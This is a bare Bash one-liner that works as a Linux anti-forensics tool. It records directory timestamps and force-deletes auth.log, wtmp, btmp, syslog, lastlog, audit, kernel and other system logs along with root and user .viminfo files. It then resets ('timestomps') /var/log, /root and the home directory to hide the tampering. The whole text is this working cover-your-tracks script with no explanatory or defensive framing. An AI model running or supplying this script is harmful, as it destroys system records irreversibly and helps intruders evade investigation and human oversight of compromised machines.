tlog=$(stat -L '/var/log' | grep 'Modify' | cut -d ' ' -f 2,3 | cut -d ':' -f 1,2 | tr -d '-' | tr -d ':' | tr -d ' '); troot=$(stat -L '/root' | grep 'Modify' | cut -d ' ' -f 2,3 | cut -d ':' -f 1,2 | tr -d '-' | tr -d ':' | tr -d ' '); thome=$(stat -L "$HOME" | grep 'Modify' | cut -d ' ' -f 2,3 | cut -d ':' -f 1,2 | tr -d '-' | tr -d ':' | tr -d ' '); logs="/var/log/auth.log /var/log/wtmp /var/log/btmp /var/log/syslog /var/log/lastlog /var/log/daemon.log /var/log/debug /var/log/messages /var/log/audit /var/log/kern.log /var/log/user.log /root/.viminfo $HOME/.viminfo"; for log in $logs; do rm -rf $log && echo "[*] Removed '$log'" || echo "[!] Couldn't remove '$log'"; done; touch -t $tlog "/var/log" && echo "Timestomped '/var/log'" || echo "Couldn't timestomp '/var/log'"; touch -t $troot "/root" && echo "Timestomped '/root'" || echo "Couldn't timestomp '/root'"; touch -t $thome "$HOME" && echo "Timestomped '$HOME'" || echo "Couldn't timestomp '$HOME'"; echo "[=] Done"
